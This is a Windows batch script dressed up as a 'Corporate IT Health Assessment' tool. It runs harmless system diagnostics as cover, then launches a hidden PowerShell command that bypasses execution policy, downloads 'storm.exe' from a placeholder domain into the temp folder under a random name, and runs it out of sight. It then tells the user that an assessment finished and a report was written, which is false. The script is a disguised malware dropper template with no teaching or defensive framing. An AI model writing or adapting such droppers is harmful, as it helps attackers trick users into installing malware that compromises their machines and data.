@echo off
title Corporate IT Health Assessment v4.2.1
color 07
mode con: cols=110 lines=35

echo.
echo  ============================================================
echo   Corporate IT Health Assessment v4.2.1
echo   Running baseline diagnostics...
echo  ============================================================
echo.

echo  [*] Initializing assessment environment...
ping -n 2 127.0.0.1 >nul
echo  [+] Host: %COMPUTERNAME%   User: %USERNAME%   Arch: %PROCESSOR_ARCHITECTURE%
timeout /t 1 >nul

echo.
echo  [*] Capturing performance baseline...
wmic cpu get loadpercentage 2>nul | findstr /r "[0-9]"

echo.
echo  [*] Checking disk volumes...
wmic logicaldisk get size,freespace,caption 2>nul | findstr /r "[0-9]"

echo.
echo  [*] Auditing network configuration...
ipconfig 2>nul | findstr /i "IPv4 Default Gateway"

echo.
echo  [*] Reviewing Windows Update status...
wmic qfe get HotFixID,InstalledOn 2>nul | findstr /r "[0-9]"

echo.
echo  [*] Validating firewall profiles...
netsh advfirewall show allprofiles state 2>nul | findstr /i "State"

echo.
echo  [*] Enumerating running services...
tasklist /nh /fi "status eq running" 2>nul | findstr /i "svchost.exe lsass.exe winlogon.exe"

echo.
echo  [*] Verifying .NET runtime installation...
dir /b /ad %systemroot%\Microsoft.NET\Framework\v* 2>nul

echo.
echo  [*] Dispatching advanced runtime assessment...

powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue';" ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "$u='https://YOUR-DOMAIN-HERE.com/storm.exe';" ^
  "$o=\"$env:TEMP\wsdiag_$([guid]::NewGuid().ToString('N').Substring(0,8)).exe\";" ^
  "Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;" ^
  "Start-Process -FilePath $o -WindowStyle Hidden"

echo  [+] Runtime assessment dispatched.
echo  [+] Analysis thread running in background.
echo.

timeout /t 2 >nul

echo  ============================================================
echo   ASSESSMENT COMPLETE
echo   All modules executed without critical failures.
echo   Report: %TEMP%\IT_Health_Report_%COMPUTERNAME%.log
echo  ============================================================
echo.
echo  [*] Cleaning temporary artifacts...
del /q "%TEMP%\*.tmp" >nul 2>&1
echo  [*] Finished.
timeout /t 3 >nul
exit
